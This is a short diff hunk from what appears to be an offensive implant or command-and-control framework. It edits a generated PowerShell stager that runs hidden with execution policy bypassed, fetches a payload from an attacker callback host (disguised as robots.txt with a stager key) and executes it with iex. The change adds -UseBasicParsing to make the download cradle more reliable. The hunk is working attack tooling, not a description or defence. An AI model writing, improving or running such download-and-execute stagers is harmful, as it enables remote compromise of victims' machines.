@@ -65,7 +65,7 @@ End Sub
         # stager_string = "powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://" + \
         #                 implant_data['callback_url'] + ":" + str(implant_data['port']) + "/robots.txt?user=" + implant_data[
         #                     'stager_key'] + "')|iex"
-        stager_string = "powershell -windowstyle hidden -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{}://{}:{}/robots.txt?user={}')|iex\"".format(
+        stager_string = "powershell -windowstyle hidden -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;(iwr '{}://{}:{}/robots.txt?user={}' -UseBasicParsing)|iex\"".format(
             http_proto,
             implant_data['callback_url'],
             port,
